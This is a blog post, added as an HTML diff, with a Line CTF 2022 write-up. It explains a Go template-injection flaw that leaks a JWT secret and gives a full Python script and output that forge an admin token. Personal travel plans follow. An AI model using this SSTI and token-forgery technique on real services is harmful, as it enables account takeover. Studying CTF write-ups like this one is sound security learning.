@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="(Web) gotm (ETC) My plan (Promise) Will meet pew  I participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf. So I am very not good. Just get a stress. So I decided">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Line CTF 2022 Write Up and Anything Finally ">
+<meta property="og:url" content="https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/index.html">
+<meta property="og:site_name" content="POCAS">
+<meta property="og:description" content="(Web) gotm (ETC) My plan (Promise) Will meet pew  I participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf. So I am very not good. Just get a stress. So I decided">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/e/e0/LINE_Corporation_Logo.png">
+<meta property="og:image" content="https://cdn.pocas.kr/passport.png">
+<meta property="og:image" content="https://www.google.com/maps/vt/data=6aya-KUNNFlNFwvGDCh96mhAnd1SPld2GW1vyxn0JulVcn45QE8J8yWDpYcB5l3T_17QICtPvuKLh3SQcrVd_wCOC9ZWZnSlAddXNi2bXAUcVPJvIZPS7XySWfWZ6-RODBDx9bwxMfB_hEk9B668qOAyiLya9CH8">
+<meta property="og:image" content="https://cdn.discordapp.com/attachments/901824677842911364/957399086401744896/unknown.png">
+<meta property="article:published_time" content="2022-03-27T09:00:53.000Z">
+<meta property="article:modified_time" content="2022-03-27T01:03:56.575Z">
+<meta property="article:author" content="POCAS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://upload.wikimedia.org/wikipedia/commons/e/e0/LINE_Corporation_Logo.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Line CTF 2022 Write Up and Anything Finally </title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/03/21/2022-03-21-GoN-CTF/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&text=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&is_video=false&description=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Line CTF 2022 Write Up and Anything Finally &body=Check out this article: https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&title=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&name=Line CTF 2022 Write Up and Anything Finally &description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.pocas.kr/2022/03/27/2022-03-27-Line-CTF/&t=Line CTF 2022 Write Up and Anything Finally "><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-gotm"><span class="toc-number">1.</span> <span class="toc-text">(Web) gotm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ETC-My-Plan"><span class="toc-number">2.</span> <span class="toc-text">(ETC) My Plan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Promise-Will-meet-pew"><span class="toc-number">3.</span> <span class="toc-text">(Promise) Will meet pew</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        <a href="/">Line CTF 2022 Write Up and Anything Finally </a>
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">POCAS</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-27T09:00:53.000Z" itemprop="datePublished">2022-03-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://upload.wikimedia.org/wikipedia/commons/e/e0/LINE_Corporation_Logo.png"></p>
+<ul>
+<li><a href="#Web-gotm">(Web) gotm</a></li>
+<li><a href="#ETC-My-Plan">(ETC) My plan</a></li>
+<li><a href="#Promise-Will-meet-pew">(Promise) Will meet pew</a></li>
+</ul>
+<p>I participated a Line CTF 2022 this saturday and I only solved the one challenge in this ctf. So I am very not good. Just get a stress. So I decided not to participate the CTF from today. I always think like: When we live the life, must do a lot of things. <del>Oh, I’m not quitting IT. I just want to try different things. Still, if I don’t like it, I’ll find another job.</del></p>
+<hr>
+<h3 id="Web-gotm"><a href="#Web-gotm" class="headerlink" title="(Web) gotm"></a>(Web) gotm</h3><p>The gotm is challenge that get the flag using a JWT of admin. And goth challenge was created using <a target="_blank" rel="noopener" href="https://go.dev/">Golang</a>.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	admin := Account&#123;admin_id, admin_pw, <span class="literal">true</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, admin)</span><br><span class="line"></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, root_handler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/auth&quot;</span>, auth_handler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/flag&quot;</span>, flag_handler)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/regist&quot;</span>, regist_handler)</span><br><span class="line">	log.Fatal(http.ListenAndServe(<span class="string">&quot;0.0.0.0:11000&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If you look at the <code>main()</code> function, you can know that set the router like: <code>/</code>, <code>/auth</code>, <code>/flag</code>, <code>/regist</code>.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flag_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, is_admin := jwt_decode(token)</span><br><span class="line">		<span class="keyword">if</span> is_admin == <span class="literal">true</span> &#123;</span><br><span class="line">			p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;Hi &quot;</span> + id + <span class="string">&quot;, flag is &quot;</span> + flag&#125;</span><br><span class="line">			res, err := json.Marshal(p)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			&#125;</span><br><span class="line">			w.Write(res)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			w.WriteHeader(http.StatusForbidden)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>First of all, If you look at the condition that bring a flag, If the is_admin of JWT is <code>true</code>, you can bring the flag.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">regist_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	uid := r.FormValue(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := r.FormValue(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> get_account(uid).id != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		w.WriteHeader(http.StatusForbidden)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">4</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	new_acc := Account&#123;uid, upw, <span class="literal">false</span>, secret_key&#125;</span><br><span class="line">	acc = <span class="built_in">append</span>(acc, new_acc)</span><br><span class="line"></span><br><span class="line">	p := Resp&#123;<span class="literal">true</span>, <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">	res, err := json.Marshal(p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	w.Write(res)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>But, When I look at the <code>regist_handler()</code> function, I could know that I cannot make the is_admin of JWT as true because it’s adds the is_admin as false.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">auth_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	uid := r.FormValue(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">	upw := r.FormValue(<span class="string">&quot;pw&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> uid == <span class="string">&quot;&quot;</span> || upw == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(acc) &gt; <span class="number">1024</span> &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	user_acc := get_account(uid)</span><br><span class="line">	<span class="keyword">if</span> user_acc.id != <span class="string">&quot;&quot;</span> &amp;&amp; user_acc.pw == upw &#123;</span><br><span class="line">		token, err := jwt_encode(user_acc.id, user_acc.is_admin)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		p := TokenResp&#123;<span class="literal">true</span>, token&#125;</span><br><span class="line">		res, err := json.Marshal(p)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		w.Write(res)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	w.WriteHeader(http.StatusForbidden)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Even when logging in, it cannot be manipulated because the stored is_admin is used.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">root_handler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	token := r.Header.Get(<span class="string">&quot;X-Token&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		tpl, err := template.New(<span class="string">&quot;&quot;</span>).Parse(<span class="string">&quot;Logged in as &quot;</span> + acc.id)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(w, &amp;acc)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>However, an SSTI vulnerability occurs in the index. This is because the ID value is passed raw to the template engine. Here, if a payload such as <code>&#123;&#123; . &#125;&#125;</code> is used, the values of all elements of the currently logged in user can be output.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Account <span class="keyword">struct</span> &#123;</span><br><span class="line">	id         <span class="type">string</span></span><br><span class="line">	pw         <span class="type">string</span></span><br><span class="line">	is_admin   <span class="type">bool</span></span><br><span class="line">	secret_key <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Since the structure of Account is the same as above, you can have the secret_key by using the SSTI vulnerability. So just leak secret_token, set is_admin of JWT to true and generate token. And you can use that token to get the flag.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">CHALL_URL = <span class="string">&quot;http://34.146.226.125&quot;</span></span><br><span class="line"><span class="comment">#CHALL_URL = &quot;http://localhost:11000&quot;</span></span><br><span class="line"></span><br><span class="line">USERNAME = <span class="string">&quot;&#123;&#123;  .      &#125;&#125;&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;dummy&quot;</span></span><br><span class="line">SESSION = requests.Session()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">REGIST</span>(<span class="params">ID, PW</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>:ID, <span class="string">&#x27;pw&#x27;</span>:PW&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = SESSION.post(CHALL_URL + <span class="string">&#x27;/regist&#x27;</span>, data=data).json()</span><br><span class="line">        <span class="keyword">if</span> res[<span class="string">&#x27;status&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] Register Success : <span class="subst">&#123;ID&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] 500 Inter Server Error&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] 500 Inter Server Error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LOGIN</span>(<span class="params">ID, PW</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>:ID, <span class="string">&#x27;pw&#x27;</span>:PW&#125;  </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = SESSION.post(CHALL_URL + <span class="string">&#x27;/auth&#x27;</span>, data=data).json()</span><br><span class="line">        <span class="keyword">if</span> res[<span class="string">&#x27;status&#x27;</span>] == <span class="literal">True</span>:</span><br><span class="line">            token = res[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[+] TOKEN : <span class="subst">&#123;token&#125;</span>&#x27;</span>)</span><br><span class="line">            header = &#123;<span class="string">&#x27;X-Token&#x27;</span>:token&#125;</span><br><span class="line">            SECRET_KEY = SESSION.get(CHALL_URL, headers=header).text.split(<span class="string">&#x27;false &#x27;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> SECRET_KEY</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+] 500 Inter Server Error&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;[+] 500 Inter Server Error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FLAG</span>(<span class="params">ADMIN_TOKEN</span>):</span><br><span class="line">    header = &#123;<span class="string">&#x27;X-Token&#x27;</span>:ADMIN_TOKEN&#125;</span><br><span class="line">    RESULT = SESSION.get(<span class="string">&#x27;http://34.146.226.125/flag&#x27;</span>, headers=header).json()</span><br><span class="line">    FLAG = RESULT[<span class="string">&#x27;msg&#x27;</span>].split(<span class="string">&#x27;flag is &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[-] FLAG : <span class="subst">&#123;FLAG&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">JWT_ENCODE</span>(<span class="params">ID, SECRET_KEY</span>):</span><br><span class="line">    AccountClaims = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>: ID,</span><br><span class="line">        <span class="string">&quot;is_admin&quot;</span>: <span class="literal">True</span></span><br><span class="line">    &#125;</span><br><span class="line">    jwt_token = jwt.encode(key=SECRET_KEY, algorithm=<span class="string">&#x27;HS256&#x27;</span>, payload=AccountClaims)</span><br><span class="line">    <span class="keyword">return</span> jwt_token</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Exploit&#x27;</span>)</span><br><span class="line">    REGIST(USERNAME, PASSWORD)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Leak the SECRET_KEY&#x27;</span>)</span><br><span class="line">    SECRET_KEY = LOGIN(USERNAME, PASSWORD)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[-] SECRET_KEY : <span class="subst">&#123;SECRET_KEY&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Generate the JWT of ADMIN&#x27;</span>)</span><br><span class="line">    ADMIN_JWT = JWT_ENCODE(USERNAME, SECRET_KEY).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[-] ADMIN_JWT : <span class="subst">&#123;ADMIN_JWT&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Leak the FLAG&#x27;</span>)</span><br><span class="line">    FLAG(ADMIN_JWT)</span><br></pre></td></tr></table></figure>
+<p>I wrote the exploit code as above.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">❯ python3 exploit.py</span><br><span class="line">[+] Exploit</span><br><span class="line">[+] Register Success : &#123;&#123;  .      &#125;&#125;</span><br><span class="line">[+] Leak the SECRET_KEY</span><br><span class="line">[+] TOKEN : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7ICAuICAgICAgfX0iLCJpc19hZG1pbiI6ZmFsc2V9.thRcBQoJEZUgNF04UMNBYjzww7307fKjCF514rJ0k-0</span><br><span class="line">[-] SECRET_KEY : fasdf972u1031xu90zm10Av</span><br><span class="line">[+] Generate the JWT of ADMIN</span><br><span class="line">[-] ADMIN_JWT : eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Int7ICAuICAgICAgfX0iLCJpc19hZG1pbiI6dHJ1ZX0.ORLfPXc2HWIjMsORBcoRCRVbsiDJCWC_kntbOAOWXhw</span><br><span class="line">[+] Leak the FLAG</span><br><span class="line">[-] FLAG : LINECTF&#123;country_roads_takes_me_home&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ETC-My-Plan"><a href="#ETC-My-Plan" class="headerlink" title="(ETC) My Plan"></a>(ETC) My Plan</h3><ul>
+<li>Things to do for 2022 years (Should no no Must!!)<ul>
+<li>learn to speak English (⭐⭐⭐⭐⭐)</li>
+<li>Travel to Japan (⭐⭐⭐)</li>
+<li>Travel to America or Australia (⭐⭐⭐⭐⭐)</li>
+</ul>
+</li>
+</ul>
+<p>I decided to go to Japan and America or Australia. America or Australia: But when I go to America or Australia, I am worry because I go to there alone. Japan: Still, I don’t worry because I go to Japan to meet someone I know.</p>
+<p><img src="https://cdn.pocas.kr/passport.png"><br>To go abroad, I already issued a my passport on 24, Mar. First I will go from Japan. After that, I plan to go somewhere else. </p>
+<p>If I go to Japan, I think I’ll go to Incheon Airport -&gt; Narita Airport -&gt; Shinjuku. Because someone I know lives in Shinjuku.</p>
+<p><img src="https://www.google.com/maps/vt/data=6aya-KUNNFlNFwvGDCh96mhAnd1SPld2GW1vyxn0JulVcn45QE8J8yWDpYcB5l3T_17QICtPvuKLh3SQcrVd_wCOC9ZWZnSlAddXNi2bXAUcVPJvIZPS7XySWfWZ6-RODBDx9bwxMfB_hEk9B668qOAyiLya9CH8" style="width: 100%;
+        max-width: 100%;
+        height: auto;"><br>If I go to Australia, I think I’ll go to Incheon Airport -&gt; Sydney Airport -&gt; Hyde Park. I’m going to spend 2~3 days playing in a 5 star hotel near Hyde Park. After that, I go to see my friends. And the US doesn’t have detailed plans yet.</p>
+<p>The total cost is probably around $10,000. Hoho I made money from Bug Bounty, Coins, and the company starting in 2021 for the money I need for travel.</p>
+<p>All plane tickets to Japan, Australia&#x2F;USA are expected to be around $2500 to $3000. Asiana standards! I think I’ll spend my stay in Japan at my acquaintance’s house.. And in Australia, as I said above, I’ll be staying in a hotel and it will cost I around $1200. I don’t know about other living expenses.</p>
+<hr>
+<h3 id="Promise-Will-meet-pew"><a href="#Promise-Will-meet-pew" class="headerlink" title="(Promise) Will meet pew"></a>(Promise) Will meet pew</h3><p><img src="https://cdn.discordapp.com/attachments/901824677842911364/957399086401744896/unknown.png" style="width: 100%;
+        max-width: 100%;
+        height: auto;"></p>
